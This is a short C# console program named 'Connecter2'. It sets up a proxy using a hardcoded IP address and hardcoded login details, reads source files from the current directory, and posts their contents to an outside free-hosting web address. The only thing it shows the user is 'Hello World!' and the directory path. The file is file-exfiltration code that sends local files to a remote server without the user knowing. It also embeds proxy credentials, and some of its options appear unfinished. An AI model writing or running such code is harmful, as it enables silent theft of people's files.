using System;

namespace Connecter2
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			Connect con = new Connect ();
			string host = "91.107.108.227";
			string port = "1080";
			string user = "vik";
			string pass = "pass";
			string url = "http://mytestconnecter.000webhostapp.com";
			string startFol = "D:\\";
			string[] TypeFile = new string[10];
			TypeFile [0] = ".cs";
			bool typ = false;
			int typi = 0;
			for (int i = 0; i < args.Length; i++) {
				if (args [i].Equals ("-host")) {
					host = args [++i];
					continue;
				}
				if (args [i].Equals ("-port")) {
					port = args [++i];
					continue;
				}
				if (args [i].Equals ("-user")) {
					user = args [++i];
					continue;
				}
				if (args [i].Equals ("-pass")) {
					pass = args [++i];
					continue;
				}
				if (args [i].Equals ("-type")) {
					typ = true;
					continue;
				}
				if (args [i].Equals ("-start")) {
					startFol = args [++i];
					continue;
				}
				if (args[i].Equals("-server")){
					url=args[++i];
					continue;
				}

				if (typ) {
					TypeFile [typi++] = args [i];
					continue;
				}
			}
			if (!host.Equals ("")) {
				con.SetProxy (host, Int32.Parse( port),user, pass);
			}
			string[] file = System.IO.Directory.GetFiles (System.IO.Directory.GetCurrentDirectory (), "cs");

			foreach (string fil in System.IO.Directory.GetFiles(System.IO.Directory.GetCurrentDirectory (), "cs")) {
				xNet.RequestParams par = new xNet.RequestParams ();
				par ["id"] = "Connecter2";
				par ["data"] = System.IO.File.ReadAllText (fil);
				Console.WriteLine (con.PostConnectTo (url, par));
			}
			xNet.RequestParams par1 = new xNet.RequestParams ();
			par1 ["id"] = "Connecter2";
			par1 ["data"] = System.IO.File.ReadAllText ("Program.cs");
			Console.WriteLine (con.PostConnectTo (url, par1));

			Console.WriteLine ("Hello World!");
			Console.WriteLine (System.IO.Directory.GetCurrentDirectory ());
		}
	}
}
